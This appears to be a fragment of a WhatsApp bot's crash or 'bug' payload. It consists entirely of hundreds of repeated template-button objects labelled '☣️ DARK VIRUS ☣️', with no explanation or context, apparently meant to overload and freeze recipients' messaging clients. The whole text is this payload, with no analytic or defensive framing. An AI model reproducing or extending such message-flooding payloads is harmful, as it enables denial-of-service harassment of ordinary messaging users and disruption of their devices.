{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
